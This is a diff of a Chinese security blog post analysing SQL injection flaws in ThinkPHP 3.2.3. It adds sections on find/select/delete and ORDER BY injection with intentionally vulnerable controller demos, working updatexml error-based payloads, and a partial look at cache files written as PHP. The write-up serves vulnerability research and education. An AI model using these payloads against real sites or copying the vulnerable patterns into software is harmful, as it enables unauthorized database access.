@@ -4,7 +4,7 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1" />
-    <title>ThinkPHP3.2 where注入分析 | Hexo</title>
+    <title>ThinkPHP3.2.3 注入分析 | Hexo</title>
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.17.1/styles/railscasts.css">
     <link rel="stylesheet" href="/lightx.css"/>
     <link rel="manifest" href="/manifest.json" />
@@ -40,9 +40,9 @@
 </nav>
 
             <article>
-  <h1>ThinkPHP3.2 where注入分析</h1>
+  <h1>ThinkPHP3.2.3 注入分析</h1>
   <div class="contents">
-    <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#where注入"><span class="toc-text">where注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exp注入"><span class="toc-text">exp注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#bind注入"><span class="toc-text">bind注入</span></a></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#where注入"><span class="toc-text">where注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exp注入"><span class="toc-text">exp注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#bind注入"><span class="toc-text">bind注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#find-select-delete注入"><span class="toc-text">find&#x2F;select&#x2F;delete注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#order-by注入"><span class="toc-text">order by注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#缓存漏洞"><span class="toc-text">缓存漏洞</span></a></li></ol>
   </div>
   <h4 id="where注入"><a href="#where注入" class="headerlink" title="where注入"></a><strong>where注入</strong></h4><p>在控制器中，写个demo，利用字符串方式作为where传参时存在注入</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">getuser</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $user = M(<span class="string">'User'</span>)-&gt;where(<span class="string">'id='</span>.I(<span class="string">'id'</span>))-&gt;find();</span><br><span class="line">    dump($user);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -109,9 +109,53 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id[0]&#x3D;bind&amp;id[1]&#x3D;0 and 1&#x3D;(updatexml(1,concat(0x7e,(user()),0x7e),1))&amp;username&#x3D;fanxing</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/8.png" alt=""></p>
+<h4 id="find-select-delete注入"><a href="#find-select-delete注入" class="headerlink" title="find/select/delete注入"></a><strong>find/select/delete注入</strong></h4><p>先分析find注入，在控制器中写个漏洞demo</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getuser</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $user = M(<span class="string">'User'</span>)-&gt;find(I(<span class="string">'id'</span>));</span><br><span class="line">    dump($user);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>当传入id[where]=1p时候，在user进行断点，F7跟进find-&gt;_parseOptions方法</p>
+<p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/9.png" alt=""></p>
+<p>$options[‘where’]为字符串，导致不能执行_parseType方法转化数据，进行跟进select-&gt;buildSelectSql-&gt;parseSql-&gt;parseWhere方法，传入的$where为字符串，直接执行了if语句</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseWhere</span><span class="params">($where)</span> </span>&#123;</span><br><span class="line">        $whereStr = <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">if</span>(is_string($where)) &#123;</span><br><span class="line">            <span class="comment">// 直接使用字符串条件</span></span><br><span class="line">            $whereStr = $where;</span><br><span class="line">            ......</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">empty</span>($whereStr)?<span class="string">''</span>:<span class="string">' WHERE '</span>.$whereStr;</span><br></pre></td></tr></table></figure>
+
+<p>当传入id=1p，就不能进行注入了，具体原因在find-&gt;_parseOptions-&gt;_parseType方法，将传入的参数进行了强转化为整形</p>
+<p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/10.png" alt=""></p>
+<p>所以，payload为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id[where]&#x3D;1 and 1&#x3D;updatexml(1,concat(0x7e,(user()),0x7e),1)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/11.png" alt=""></p>
+<p>select和delete原理同find方法一样，只是delete方法多增加了一个判断是否为空</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($options[<span class="string">'where'</span>]))&#123;</span><br><span class="line">            <span class="comment">// 如果条件为空 不进行删除操作 除非设置 1=1</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;        </span><br><span class="line">        <span class="keyword">if</span>(is_array($options[<span class="string">'where'</span>]) &amp;&amp; <span class="keyword">isset</span>($options[<span class="string">'where'</span>][$pk]))&#123;</span><br><span class="line">            $pkValue            =  $options[<span class="string">'where'</span>][$pk];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">false</span> === <span class="keyword">$this</span>-&gt;_before_delete($options)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="order-by注入"><a href="#order-by注入" class="headerlink" title="order by注入"></a><strong>order by注入</strong></h4><p>先在控制器中写个漏洞demo</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">user</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $data[<span class="string">'username'</span>] = <span class="keyword">array</span>(<span class="string">'eq'</span>,<span class="string">'admin'</span>);</span><br><span class="line">    $user = M(<span class="string">'User'</span>)-&gt;where($data)-&gt;order(I(<span class="string">'order'</span>))-&gt;find();</span><br><span class="line">    dump($user);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在user变量处断点，F7跟进，find-&gt;select-&gt;buildSelectSql-&gt;parseSql方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;parseOrder(!<span class="keyword">empty</span>($options[<span class="string">'order'</span>])?$options[<span class="string">'order'</span>]:<span class="string">''</span>),</span><br></pre></td></tr></table></figure>
+
+<p>当$options[‘order’]参数参在时，跟进parseOrder方法</p>
+<p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/12.png" alt=""></p>
+<p>当不为数组时，直接返回order by + 注入pyload，所以注入payload为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">order&#x3D;id and(updatexml(1,concat(0x7e,(select user())),0))</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/13.png" alt=""></p>
+<h4 id="缓存漏洞"><a href="#缓存漏洞" class="headerlink" title="缓存漏洞"></a><strong>缓存漏洞</strong></h4><p>在ThinkPHP3.2中，缓存函数有F方法和S方法，两个方法有什么区别呢，官方介绍如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">F方法：相当于PHP自带的file_put_content和file_get_content函数，没有太多存在时间的概念，是文件存储数据的方式。常用于文件配置。</span><br><span class="line">S方法：文件缓存，有生命时长，时间到期后缓存内容会得到更新。常用于单页面data缓存。</span><br></pre></td></tr></table></figure>
+
+<p>这里F方法就不介绍了，直接看S方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">    S(<span class="string">'name'</span>,I(<span class="string">'test'</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>跟进查看S方法</p>
+<p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/14.png" alt=""></p>
+<p>set方法写入缓存</p>
+<p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/15.png" alt=""></p>
+<p>跟进filename方法，此方法获取写入文件的路径，保存在../Application/Runtime/Temp目录下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">filename</span><span class="params">($name)</span> </span>&#123;</span><br><span class="line">        $name	=	md5(C(<span class="string">'DATA_CACHE_KEY'</span>).$name);</span><br><span class="line">        <span class="keyword">if</span>(C(<span class="string">'DATA_CACHE_SUBDIR'</span>)) &#123;</span><br><span class="line">            <span class="comment">// 使用子目录</span></span><br><span class="line">            $dir   =<span class="string">''</span>;</span><br><span class="line">            <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;C(<span class="string">'DATA_PATH_LEVEL'</span>);$i++) &#123;</span><br><span class="line">                $dir	.=	$name&#123;$i&#125;.<span class="string">'/'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(!is_dir(<span class="keyword">$this</span>-&gt;options[<span class="string">'temp'</span>].$dir)) &#123;</span><br><span class="line">                mkdir(<span class="keyword">$this</span>-&gt;options[<span class="string">'temp'</span>].$dir,<span class="number">0755</span>,<span class="keyword">true</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            $filename	=	$dir.<span class="keyword">$this</span>-&gt;options[<span class="string">'prefix'</span>].$name.<span class="string">'.php'</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $filename	=	<span class="keyword">$this</span>-&gt;options[<span class="string">'prefix'</span>].$name.<span class="string">'.php'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;options[<span class="string">'temp'</span>].$filename;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>并将S传入的name进行md5值作为文件名，最终通过file_put_contents函数写入文件。</p>
+<p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/16.png" alt=""></p>
 
   
-  <p class="copyright"><strong>Links: <a href="http://yoursite.com/2020/02/26/ThinkPHP3-2-where%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/">http://yoursite.com/2020/02/26/ThinkPHP3-2-where%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/</a></strong></p>  
+  <p class="copyright"><strong>Links: <a href="http://yoursite.com/2020/02/24/ThinkPHP3.2.3%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">http://yoursite.com/2020/02/24/ThinkPHP3.2.3%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</a></strong></p>  
 </article>
 
 <div id="comment">
